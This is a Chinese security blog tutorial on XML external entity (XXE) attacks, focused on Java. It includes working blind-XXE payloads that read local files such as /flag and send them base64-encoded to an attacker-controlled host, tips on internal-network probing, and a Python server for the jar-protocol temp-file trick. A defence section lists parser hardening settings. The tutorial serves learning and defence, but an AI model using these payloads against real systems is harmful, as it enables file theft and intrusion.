---
title: "论java中的XXE"
onlyTitle: true
date: 2024-11-6 20:33:32
categories:
- java
- other漏洞
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8117.png
---

简单介绍一下XXE

## XXE简述

### 内部实体与外部实体

一般是由一个DTD控制一个XML的格式。比如：

DOCTYPE元素后跟的第一个ELEMENT定义了能接收的标签集合

```dtd
<?xml version="1.0"?>//这一行是 XML 文档定义
<!DOCTYPE message [
<!ELEMENT message (receiver ,sender ,header ,msg)>
<!ELEMENT receiver (#PCDATA)>
<!ELEMENT sender (#PCDATA)>
<!ELEMENT header (#PCDATA)>
<!ELEMENT msg (#PCDATA)>]>
```

XML就要按照DTD要求的写：

```XML
<message>
<receiver>Myself</receiver>
<sender>Someone</sender>
<header>TheReminder</header>
<msg>This is an amazing book</msg>
</message>
```

但有时候我们需要动态的定义一个标签，这样就不用逐个去改动一个类型的标签。比如下面这个DTD

定义了一个根元素为foo的xml标签，接收任何类型（ANY）的标签，如果标签内引用了`xxe`，则替换为`test`

```dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >
]>
```

然后在XML中用`&实体名;`进行调用，可以省略根元素

```xml
<user>&xxe;</user>
```

事实上，`<!ELEMENT foo ANY >`还可以进行省略，并把DTD和XML写到一个文件

```dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe "test" >
]>
<user>&xxe;</user>
```

这就是内部实体

外部实体就是DTD里嵌套读取外部的DTD，用SYSTEM关键字声明。这里读取的文件可以是任何格式的文件

```dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >
]>
<user>&xxe;</user>
```

```dtd
<!ENTITY 实体名 SYSTEM url > //外部实体
<!ENTITY 实体名 实体的值 > //内部实体
```

### 参数实体

除了上面的`&实体名;`引用的实体，还有`% 实体名;`引用的参数实体。（空格不能省略）

区别在于参数实体的引用是写在DTD的

```dtd
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd">
%remote-dtd;
```

看到这里你可能觉得参数实体这个东西很多余，但是在payload的拼接处发挥了巨大的作用

XML解析引用的时候，并不接收引起xml格式混乱的字符，XML中的`&<>,`等均需要转义，否则需要加上`<![CDATA[]]>`对字符串进行包裹转义。

按理说，`&实体名;`进行包裹的代码如下，可是完全不能解析。不能先解析再拼接

```dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ENTITY start SYSTEM "<![CDATA[" >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >
<!ENTITY end SYSTEM "]]>" >
]>
<user>&start;&xxe;&end;</user>
```

利用`% 实体名;`可以实现先拼接后解析

EvilDTD：

```dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
%dtd; ]> 

<roottag>&all;</roottag>
```

evil.dtd：

```dtd
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```

实现了DTD之间的联动

### XXE盲注

上面的读文件利用，需要有回显。那无回显呢？

SYSTEM关键字支持http协议，想办法在URL后拼接回显结果，当然还是用参数实体

先定义一个file实体，用以读取文件；然后定义一个嵌套的int实体，int包含了send实体。其中`&#37;`是`%`的Unicode编码，因为`%`不允许出现在Entity的value中

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106142351840.png)

测试的漏洞代码：

```php
<?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
?>
```

LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值
LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件

#### 正确的盲注

xxetest.dtd，其中URL为回显vps地址

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Users/Administrator/Desktop/test.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://172.18.240.1:8085/?p=%file;'>">
```

POST数据

```dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE payload [
<!ENTITY % remote SYSTEM "http://127.0.0.1:8888/xxetest.dtd">
%remote;%int;%send;
]>
<payload>1</payload>
```

尽管php在报错

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106151718676.png)

还是成功回显了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106151621941.png)



接下来列一些实验中错误的payload，并说明原因

#### 试图将xxetest.dtd直接POST过去

直接省略remote实体

```dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE payload [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Users/Administrator/Desktop/test.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://172.18.240.1:8085/?p=%file;'>"
%int;%send;
]>
<payload>1</payload>
```

报错：`PEReferences(Parameter-entity) forbidden in internal subset in Entity`

禁止在内部Entity中引用参数实体

int没用SYSTEM关键字，是参数实体的同时也是内部实体，用`%int;%send;`引用了内部实体的参数实体，所以报错。用外部实体去包含，就能成功加载了

#### 试图省略int标签

省略int标签呢？

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C:/Users/Administrator/Desktop/test.txt">
<!ENTITY % send SYSTEM 'http://172.18.240.1:8085/?p=%file;'>
```

结果发现%file并没有解析

https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf

第10页明确了，XML解析器不会解析同级参数实体的内容。

但是当两个参数不是同级，用另外一个标签去嵌套后，就能使用另一个参数实体



### XXE引用本地DTD

如果目标机器不允许请求外网DTD呢?

ubuntu系统自带/usr/share/yelp/dtd/docbookx.dtd，其中定义了很多参数实体并调用了它。如果我们重写一个参数实体（ISOamso）并引用它，该参数实体依旧在外部

```dtd
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;send;
    '> 
    %remote;
]>
<message>1234</message>
```



php filter伪协议还支持http协议读文件，于是还能打个内网探测。

```
php://filter/convert.base64-encode/resource=http:// + ip
```



不同语言支持的协议不一样

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241106170129856.png)

libxml2.9.1及以后默认不解析外部实体，java中netdoc类似file协议



### XXE的防御

* php

```php
libxml_disable_entity_loader(true);
```

* java

```java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);

.setFeature("http://xml.org/sax/features/external-general-entities",false)

.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
```

* Python

```python
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```



## java中的XXE

以下函数支持解析外部实体

```java
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuilderFactory
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
javax.xml.transform.TransformerFactory
javax.xml.validation.Validator
javax.xml.validation.SchemaFactory
javax.xml.transform.sax.SAXTransformerFactory
javax.xml.transform.sax.SAXSource
org.xml.sax.XMLReader
org.xml.sax.helpers.XMLReaderFactory
org.dom4j.io.SAXReader
org.jdom.input.SAXBuilder
org.jdom2.input.SAXBuilder
javax.xml.bind.Unmarshaller
javax.xml.xpath.XpathExpression
javax.xml.stream.XMLStreamReader
org.apache.commons.digester3.Digester
```

分别介绍一下核心代码

### DocumentBuilder

有回显输出

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document document = db.parse(new InputSource(new StringReader(xml));
```

### SAXReader

无回显，需要dom4j依赖

```java
SAXReader reader = new SAXReader();
reader.read(new InputSource(new StringReader(body)));
```

### SAXParserFactory

无回显

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser parser = spf.newSAXParser();
parser.parse(new InputSource(new StringReader(xml)), new DefaultHandler());  // parse xml
```

### XMLReaderFactory

```java
XMLReader xmlReader = XMLReaderFactory.createXMLReader();
xmlReader.parse(new InputSource(new StringReader(xml)));  // parse xml
```

### Digester

```java
Digester digester = new Digester();
digester.parse(new StringReader(xml));
```

### XMLReader

```java
SAXParserFactory spf = SAXParserFactory.newInstance();
SAXParser saxParser = spf.newSAXParser();
XMLReader xmlReader = saxParser.getXMLReader();
xmlReader.parse(new InputSource(new StringReader(xml)));
```



### jar文件上传

java中针对XML有一种专属的攻击方式

因为java中存在jar协议的原因，jar协议处理文件的过程如下：

1. 下载 jar/zip 文件到临时文件中
2. 提取出我们指定的文件
3. 删除临时文件

file协议可以进行列目录，进而找到临时文件路径，也可以通过报错信息

一个DocumentBuilder解析XML的case：

```java
package xml_test;
import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Attr;
import org.w3c.dom.Comment;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

/**
 * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上
 * @author zhanglong
 *
 */
public class xmlcase
{
    public static void main(String[] args) throws Exception
    {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();
        Document doc = db.parse(new File("student.xml"));
        //获得根元素结点
        Element root = doc.getDocumentElement();
        parseElement(root);
    }

    private static void parseElement(Element element)
    {
        String tagName = element.getNodeName();
        NodeList children = element.getChildNodes();
        System.out.print("<" + tagName);
        //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断
        NamedNodeMap map = element.getAttributes();
        //如果该元素存在属性
        if(null != map)
        {
            for(int i = 0; i < map.getLength(); i++)
            {
                //获得该元素的每一个属性
                Attr attr = (Attr)map.item(i);
                String attrName = attr.getName();
                String attrValue = attr.getValue();
                System.out.print(" " + attrName + "=\"" + attrValue + "\"");
            }
        }
        System.out.print(">");
        for(int i = 0; i < children.getLength(); i++)
        {
            Node node = children.item(i);
            //获得结点的类型
            short nodeType = node.getNodeType();
            if(nodeType == Node.ELEMENT_NODE)
            {
                //是元素，继续递归
                parseElement((Element)node);
            }
            else if(nodeType == Node.TEXT_NODE)
            {
                //递归出口
                System.out.print(node.getNodeValue());
            }
            else if(nodeType == Node.COMMENT_NODE)
            {
                System.out.print("<!--");
                Comment comment = (Comment)node;
                //注释内容
                String data = comment.getData();
                System.out.print(data);
                System.out.print("-->");
            }
        }
        System.out.print("</" + tagName + ">");
    }
}
```

加载的student.xml：

```dtd
<!DOCTYPE convert [ 
<!ENTITY  remote SYSTEM "jar:http://localhost:9999/jar.zip!/wm.php">
]>
<convert>&remote;</convert>
```

如果jar.zip中不存在wm.php，就会报错并输出寻找的路径

请求的恶意9999服务器如下，运行脚本时第一个参数写jar_file路径

```python
import sys 
import time 
import threading 
import socketserver 
from urllib.parse import quote 
import http.client as httpc 

listen_host = 'localhost' 
listen_port = 9999 
jar_file = sys.argv[1]

class JarRequestHandler(socketserver.BaseRequestHandler):  
    def handle(self):
        http_req = b''
        print('New connection:',self.client_address)
        while b'\r\n\r\n' not in http_req:
            try:
                http_req += self.request.recv(4096)
                print('Client req:\r\n',http_req.decode())
                jf = open(jar_file, 'rb')
                contents = jf.read()
                headers = ('''HTTP/1.0 200 OK\r\n'''
                '''Content-Type: application/java-archive\r\n\r\n''')
                self.request.sendall(headers.encode('ascii'))

                self.request.sendall(contents[:-1])
                time.sleep(30)
                print(30)
                self.request.sendall(contents[-1:])

            except Exception as e:
                print ("get error at:"+str(e))


if __name__ == '__main__':

    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
    print ('waiting for connection...') 
    server_thread = threading.Thread(target=jarserver.serve_forever) 
    server_thread.daemon = True 
    server_thread.start() 
    server_thread.join()
```

为了让该文件长时间停留在系统中，使用sleep延长文件传输时间。又因为需要保持文件的完整性，需要用hex编辑器在文件末尾添加垃圾字符，延长整个传输时间



参考：

https://xz.aliyun.com/t/3357?time__1311=n4%2Bxnii%3DG%3D0Q0%3DLH405DK3gcjDCb1DgnxYuwhrID#toc-21